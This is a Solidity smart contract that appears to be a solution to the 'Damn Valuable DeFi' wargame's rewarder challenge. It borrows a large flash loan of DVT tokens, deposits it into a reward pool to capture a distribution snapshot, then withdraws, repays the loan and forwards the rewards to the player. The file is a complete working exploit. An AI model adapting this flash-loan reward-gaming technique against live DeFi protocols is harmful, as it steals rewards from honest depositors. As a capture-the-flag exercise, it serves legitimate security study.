// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface ITheRewarderPool {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
    function distributeRewards() external returns (uint256 rewards);
}

contract Receiver {
    address immutable flashLoanerPool;
    address immutable theRewarderPool;
    address immutable dvtToken;
    address immutable rewardToken;
    address immutable player;
    
    constructor(address _flashLoanerPool, address _theRewarderPool, address _dvtToken, address _rewardToken, address _player) {
        flashLoanerPool = _flashLoanerPool;
        theRewarderPool = _theRewarderPool;
        dvtToken = _dvtToken;
        rewardToken = _rewardToken;
        player = _player;
    }

    function run() external {
        IFlashLoanerPool(flashLoanerPool).flashLoan(1000000 ether);
    }

    function receiveFlashLoan(uint256 amount) external {
        console.log("receiveFlashLoan", amount);
        IERC20(dvtToken).approve(theRewarderPool, amount);
        ITheRewarderPool(theRewarderPool).deposit(amount);
        (uint256 rewards) = ITheRewarderPool(theRewarderPool).distributeRewards();
        console.log("rewards", rewards);
        ITheRewarderPool(theRewarderPool).withdraw(amount);
        IERC20(dvtToken).transfer(flashLoanerPool, amount);
        IERC20(rewardToken).transfer(player, rewards);
    }
}